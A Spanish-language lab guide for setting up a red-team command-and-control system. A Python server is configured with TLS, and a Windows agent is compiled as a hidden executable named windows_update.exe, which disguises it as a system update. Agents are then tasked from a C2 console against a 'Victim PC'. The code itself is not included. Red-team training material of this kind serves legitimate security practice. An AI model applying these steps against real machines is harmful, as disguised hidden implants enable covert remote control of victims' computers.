# 🚀 Red Team C2 Lab - Guía de Implementación

**⚠️ Solo para entornos de laboratorio controlados con permiso explícito.**

---

## 1. Configurar el Laboratorio

### 1.1 Máquina Linux (C2 Server)
sudo apt update
sudo apt install python3 python3-pip openssl sqlite3
pip3 install asyncio
### 1.2 Generar certificados SSL
openssl req -x509 -newkey rsa:4096 \
  -keyout server.key -out server.crt \
  -days 365 -nodes \
  -subj "/C=US/ST=Demo/L=Lab/O=RedTeam/CN=c2.lab.local"
### 1.3 Configurar firewall
sudo ufw allow 8443/tcp
### 1.4 Ejecutar servidor
python3 c2_server.py
## 2. Compilar el Agente Windows
En Windows con Visual Studio Developer Command Prompt:

cl /std:c++17 /O2 /MT /DNDEBUG /EHsc ^
    agent_working.cpp ^
    /link wininet.lib crypt32.lib advapi32.lib ^
    /OUT:windows_update.exe /SUBSYSTEM:WINDOWS
Esto genera un ejecutable oculto de consola que se comunica con el servidor C2.

## 3. Configurar Red
En laboratorio controlado:

Dispositivo	IP
C2 Server	192.168.1.100
Victim PC	192.168.1.101
Network	Aislada, sin internet real
Asegúrate de que ambos dispositivos puedan hacer ping entre sí.

## 4. Prueba de Funcionamiento
Iniciar servidor C2:

python3 c2_server.py
Ejecutar agente en Windows:

windows_update.exe
Interactuar desde la consola C2:

C2> agents
C2> tasks WIN10-PC01-Admin-abc123
Aquí puedes listar agentes, crear tareas, y consultar resultados.

## 5. Notas Importantes
La clave maestra (MASTER_KEY) debe coincidir entre agente y servidor.

La comunicación en este laboratorio usa HTTP/HTTPS local. No usar en entornos reales sin seguridad adicional.

Solo ejecutar en entornos de laboratorio aislados.

Para desarrollo seguro, puedes modificar el sleep_time y jitter en el agente para simular latencia real.
